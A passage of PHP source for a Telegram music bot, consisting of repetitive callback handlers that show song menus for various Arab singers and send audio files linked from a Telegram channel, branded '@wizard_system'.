[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}

if($data=="alalsm1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/782",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alalsm2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/783",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alalsm3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/784",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alalsm4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/785",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alalsm5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/786",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alalsm6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/787",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="wlalan" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني احلام وهبي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧يجيك يوم  ','callback_data'=>"wlalan1"],['text'=>' 🎧بره من حياتي','callback_data'=>"wlalan2"]],
[['text'=>'🎧 اساليني ','callback_data'=>"wlalan3"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="wlalan1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/771",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wlalan2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/772",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="wlalan3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/773",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="bxska" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني اسراء الاصيل 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧عروسه  ','callback_data'=>"bxska1"],['text'=>' 🎧اهز يدي','callback_data'=>"bxska2"]],
[['text'=>'🎧 سحرني ','callback_data'=>"bxska3"],['text'=>' 🎧هذا الغالي','callback_data'=>"bxska4"]],
[['text'=>'🎧الا نفترك ','callback_data'=>"bxska5"],['text'=>'🎧 نظر عيني ','callback_data'=>"bxska6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song4"]],
]
])
]);
}


if($data=="bxska1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/775",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bxska2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/776",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bxska3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/777",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bxska4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/778",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bxska5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/779",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="bxska6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/780",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="song3" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر مغنيك 🎧
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'ابراهيم الحكمي 🎧','callback_data'=>"hakami"],['text'=>'ماجد المهندس 🎧','callback_data'=>"mohands"]],
[['text'=>'خالد عبد الرحمن  🎧','callback_data'=>"khrhmn"],['text'=>'راشد الماجد 🎧','callback_data'=>"mgadaa"]],
[['text'=>'طلال مداح 🎧','callback_data'=>"sjsjwl"],['text'=>'جابر الكاسر 🎧','callback_data'=>"kasro"]],
[['text'=>'جواد العلي 🎧','callback_data'=>"alojs"],['text'=>'قصي الخضر 🎧','callback_data'=>"qusoo"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song"]],
]
])
]);
}


if($data=="alojs" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني جواد العلي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧يجيك يوم  ','callback_data'=>"alojs1"],['text'=>' 🎧بره من حياتي','callback_data'=>"alojs2"]],
[['text'=>'🎧 اساليني ','callback_data'=>"alojs3"],['text'=>' 🎧اموت واعرف','callback_data'=>"alojs4"]],
[['text'=>'🎧الشوق ','callback_data'=>"alojs5"],['text'=>'🎧  تحبني وتعذبني','callback_data'=>"alojs6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="alojs1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/764",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alojs2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/765",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alojs3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/766",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alojs4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/767",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alojs5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/768",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="alojs6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/769",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="qusoo" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني قصي الخضري 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧يلا  ','callback_data'=>"qusoo1"],['text'=>' 🎧اربز جوت تالنت','callback_data'=>"qusoo2"]],
[['text'=>'🎧 يا حروفي ','callback_data'=>"qusoo3"],['text'=>' 🎧الدار ديالي','callback_data'=>"qusoo4"]],
[['text'=>'🎧صبوحه ','callback_data'=>"qusoo5"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="qusoo1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/758",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qusoo2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/759",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qusoo3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/760",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qusoo4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/761",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="qusoo5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/762",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="kasro" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني جابر الكاسر 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧هيضتني  ','callback_data'=>"kasro1"],['text'=>' 🎧ما ارضي عليه','callback_data'=>"kasro2"]],
[['text'=>'🎧 بجرب يوم ','callback_data'=>"kasro3"],['text'=>' 🎧دخيلك','callback_data'=>"kasro4"]],
[['text'=>'🎧ماهو هنا ','callback_data'=>"kasro5"],['text'=>'🎧  احبك يا مجنون','callback_data'=>"kasro6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="kasro1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/751",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kasro2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/752",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kasro3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/753",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kasro4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/754",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kasro5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/755",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="kasro6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/756",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="sjsjwl" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني طلال المادح 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 ما تقول ','callback_data'=>"sjsjwl1"],['text'=>' 🎧زمان الصمت','callback_data'=>"sjsjwl2"]],
[['text'=>'🎧 وترحل صرختي ','callback_data'=>"sjsjwl3"],['text'=>' 🎧مقادير','callback_data'=>"sjsjwl4"]],
[['text'=>'🎧ظالم ولكن ','callback_data'=>"sjsjwl5"],['text'=>'🎧  انتهينا','callback_data'=>"sjsjwl6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}

if($data=="sjsjwl1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/744",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjwl2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/745",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjwl3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/746",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjwl4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/747",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjwl5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/748",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="sjsjwl6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/749",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="mgadaa" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني راشد الماجد 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 ولهان ','callback_data'=>"mgadaa1"],['text'=>' 🎧الاسد','callback_data'=>"mgadaa2"]],
[['text'=>'🎧 السندباد ','callback_data'=>"mgadaa3"],['text'=>' 🎧شيسوي','callback_data'=>"mgadaa4"]],
[['text'=>'🎧سارق القلب ','callback_data'=>"mgadaa5"],['text'=>'🎧  مشكلني','callback_data'=>"mgadaa6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="mgadaa1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/737",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mgadaa2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/738",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mgadaa3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/739",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mgadaa4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/740",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mgadaa5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/741",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mgadaa6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/742",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}


if($data=="khrhmn" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني خالد عبدالرحمن 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 شلون مغليك ','callback_data'=>"khrhmn1"],['text'=>' 🎧يا عذابي','callback_data'=>"khrhmn2"]],
[['text'=>'🎧 انتظرته ','callback_data'=>"khrhmn3"],['text'=>' 🎧صارحيني','callback_data'=>"khrhmn4"]],
[['text'=>'🎧خبروه ','callback_data'=>"khrhmn5"],['text'=>'🎧  العطا','callback_data'=>"khrhmn6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="khrhmn1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/729",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="khrhmn2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/730",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="khrhmn3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/731",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="khrhmn4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/732",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="khrhmn5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/733",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="khrhmn6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/734",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="mohands" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ماجد المهندس 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 هتان ','callback_data'=>"mohands1"],['text'=>' 🎧مو ضروري','callback_data'=>"mohands2"]],
[['text'=>'🎧 عطشان ','callback_data'=>"mohands3"],['text'=>' 🎧تناديك','callback_data'=>"mohands4"]],
[['text'=>'🎧يهزك الشوق ','callback_data'=>"mohands5"],['text'=>'🎧  ودعت روحي','callback_data'=>"mohands6"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}


if($data=="mohands1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/721",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mohands2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/722",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mohands3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/723",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mohands4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/724",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mohands5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/725",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="mohands6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/726",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="hakami" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني ابراهيم الحكمي 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 فرحتي فيك ','callback_data'=>"hakami1"],['text'=>' 🎧مهما تبعد','callback_data'=>"hakami2"]],
[['text'=>'🎧 صدقني ','callback_data'=>"hakami3"],['text'=>' 🎧شو بني','callback_data'=>"hakami4"]],
[['text'=>'🎧اشتاقتلك ','callback_data'=>"hakami5"],['text'=>'🎧 لحظه وداعك','callback_data'=>"hakami6"]],
[['text'=>'🎧 تحياتي','callback_data'=>"hakami7"],['text'=>'🎧 هيك منغني ','callback_data'=>"hakami8"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song3"]],
]
])
]);
}



if($data=="hakami1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/711",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/712",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/713",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/714",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/715",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/716",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/717",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="hakami8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/718",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}



if($data=="song1" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
اختر اغنيتك 🎧
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>'ويجز 🎧','callback_data'=>"wegz"],['text'=>'بابلو 🎧','callback_data'=>"bablo"],['text'=>'الجوكر 🎧','callback_data'=>"elgoker"]],
[['text'=>'ابيوسف 🎧','callback_data'=>"abyo"],['text'=>'مروان موسي 🎧','callback_data'=>"maro"],['text'=>'عفروتو 🎧','callback_data'=>"afrt"]],
[['text'=>'عنبه 🎧','callback_data'=>"anpa"],['text'=>'محمد سعيد 🎧','callback_data'=>"sidoo"],['text'=>'عمار حسني 🎧','callback_data'=>"amrhos"]],
[['text'=>'شاكوش 🎧','callback_data'=>"skosh"],['text'=>'عمرو دياب 🎧','callback_data'=>"diab"],['text'=>'اصالة 🎧','callback_data'=>"asala"]],
[['text'=>'احمد كامل 🎧','callback_data'=>"kaml"],['text'=>'حسين الجسمي 🎧','callback_data'=>"gsmy"],['text'=>'رامي صبري 🎧','callback_data'=>"sabryy"]],
[['text'=>'حماقي 🎧','callback_data'=>"hmaki"],['text'=>'بيكا 🎧','callback_data'=>"bika"],['text'=>'تامر حسني 🎧','callback_data'=>"hosnyy"]],
[['text'=>'مسلم 🎧','callback_data'=>"muslim"],['text'=>'شاهين 🎧','callback_data'=>"sahyn"],['text'=>'باتيستوتا 🎧','callback_data'=>"batisto"]],
[['text'=>'ويزي 🎧','callback_data'=>"wezy"],['text'=>'ابو الانوار 🎧','callback_data'=>"anoar"],['text'=>'مهرجانات 🎧','callback_data'=>"mahrgan"]],
[['text'=>'شاموفرز 🎧','callback_data'=>"shrmof"],['text'=>'كاريوكي 🎧','callback_data'=>"karoki"],['text'=>'احمد مكي 🎧','callback_data'=>"mikoo"]],
[['text'=>'اوكا واورتيجا 🎧','callback_data'=>"okaworti"],['text'=>'سعد المجرد 🎧','callback_data'=>"elmgrd"],['text'=>'اليسا 🎧','callback_data'=>"lisao"]],
 [['text'=>'سورس ويزرد ™','url'=>'t.me/wizard_system']],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song"]],
]
])
]);
}
if($data=="lisao" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني اليسا 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 صاحبه رأي','callback_data'=>"lisao1"],['text'=>' 🎧 نفسي أقوله','callback_data'=>"lisao2"]],
[['text'=>'🎧 مكتوبه ليك ','callback_data'=>"lisao3"],['text'=>' 🎧عكس الي شايفنها','callback_data'=>"lisao4"]],
[['text'=>'🎧 ع بالي حبيبي ','callback_data'=>"lisao5"],['text'=>'🎧 كارهني','callback_data'=>"lisao6"]],
[['text'=>'🎧 وفي','callback_data'=>"lisao7"],['text'=>'🎧 ياريت','callback_data'=>"lisao8"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}


if($data=="lisao1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/683",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/684",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao3"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/685",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao4"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/686",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao5"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/687",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao6"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/688",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao7"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/689",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="lisao8"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/690",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}

if($data=="elmgrd" ){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>'
𓆩 قائمه اغاني سعد المجرد 𓆪
',
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[['text'=>' 🎧 عدي الكلام','callback_data'=>"elmgrd1"],['text'=>' 🎧 غزالي','callback_data'=>"elmgrd2"]],
[['text'=>'🎧 إنساي ','callback_data'=>"elmgrd3"],['text'=>' 🎧غلطانه','callback_data'=>"elmgrd4"]],
[['text'=>'🎧 يخليك للي ','callback_data'=>"elmgrd5"],['text'=>'🎧 معلم','callback_data'=>"elmgrd6"]],
[['text'=>'🎧 انتي','callback_data'=>"elmgrd7"],['text'=>'🎧 كزبلانكا','callback_data'=>"elmgrd8"]],
[['text'=>'🎧 نجيبك نجيبك','callback_data'=>"elmgrd9"],['text'=>'🎧اسف حبيبي ','callback_data'=>"elmgrd10"]],
[['text'=>'🎧 ليت جو','callback_data'=>"elmgrd11"],['text'=>'🎧مال حبيبي ','callback_data'=>"elmgrd12"]],
[['text'=>'𝖇𝖆𝖈𝖐 🔙','callback_data'=>"song1"]],
]
])
]);
}

if($data=="elmgrd1"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
 audio =>"https://t.me/mahmoumagdx/671",
 'caption'=>"by : @wizard_system",
 reply_to_message_id =>$message->message_id, 
]);
}
if($data=="elmgrd2"){
$editM =bot( sendaudio ,[
 'chat_id'=>$chat_id, 
